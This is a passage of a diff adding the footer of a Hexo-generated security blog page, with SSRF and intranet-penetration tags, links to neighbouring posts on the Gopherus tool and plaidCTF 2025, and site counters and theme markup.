+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/ssrf/" rel="tag"># ssrf</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/868225d6.html" rel="prev" title="gopherus工具剖析">
+                  <i class="fa fa-angle-left"></i> gopherus工具剖析
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/posts/6fd07890.html" rel="next" title="plaidCTF2025">
+                  plaidCTF2025 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">baozongwi</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Word count total">3.1m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">87:21</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
